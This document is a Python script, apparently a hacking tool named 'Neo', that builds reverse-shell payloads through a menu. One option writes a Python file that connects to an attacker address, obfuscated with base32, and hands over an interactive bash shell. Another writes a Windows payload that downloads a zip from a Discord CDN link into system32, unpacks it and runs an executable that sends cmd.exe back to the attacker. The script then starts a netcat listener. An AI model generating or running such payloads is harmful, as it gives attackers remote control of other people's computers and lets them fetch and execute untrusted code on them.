# v0.1.1
# Install an import libs
from os import system
system("sudo pip3 install art")
system("sudo pip3 install termcolor")
system("clear")
from art import *
from termcolor import colored

def frame():
    # graphics
    system("clear||cls")
    print(colored(text2art("Neo".center(30)),'cyan'))
    print(colored("Created by Psyquoquack-pack\n\n".center(60),'red'))
    # Diffrents Choice
    print("[1]- Python reverse shell\n[2]- Python reverse shell for windows\n[3]- Install requirements\n\n")
    choice1 = input("[1-99]:")
    # payload linux and mac
    if choice1 == "1":
        import base64
        print(colored(text2art("PAYLOAD".center(30)),'red'))
        cpl = input("Attacker Ip:")
        port = input("Attacker Open Port [R: 87]:")
        encodedBytes = base64.b32encode(bytearray(cpl, 'ascii')).decode('utf-8')
        # write and close file
        fichier = open("payload.py", "w")
        towrite = "import socket,subprocess,os,base64;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((base64.b32decode(bytearray('"+encodedBytes+"', 'ascii')).decode('utf-8'),"+port+"));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
        fichier.write(str(towrite))
        fichier.close()
        print(colored("Payload generated !".center(60),'red'))
        toexe = "sudo netcat -lnvp "+port+""
        system(toexe) # lisen port
    # payload for windows
    if choice1 == "2":
        import base64
        print(colored(text2art("PAYLOAD".center(30)),'red'))
        cpl = input("Attacker Ip:")
        port = input("Attacker Open Port [R: 87]:")
        encodedBytes = base64.b32encode(bytearray(cpl, 'ascii')).decode('utf-8')
        # write and close file
        fichier = open("winpayload.py", "w")
        towrite = "import base64,os;os.system('@echo off');os.system('');os.system('powershell Invoke-WebRequest https://cdn.discordapp.com/attachments/769931868488597514/889144849461313616/sc.zip -O C:/windows/system32/sc.zip');os.system('tar -xf C:/windows/system32/sc.zip');code_cry = '"+encodedBytes+"';ash = 'ascii';utf ='utf-8';os.system('C:/windows/system32/sc.exe '+base64.b32decode(bytearray(code_cry, ash)).decode(utf)+' "+port+" -e cmd.exe');"
        fichier.write(str(towrite))
        fichier.close()
        print(colored("Payload generated !".center(60),'red'))
        toexe = "sudo netcat -lnvp "+port+""
        system(toexe) # lisen port
    # install libs
    if choice1 == "3":
        system("sudo apt-get install nmap")
        system("sudo apt-get install netcat")
        frame()
    else:
        exit(0)
frame()
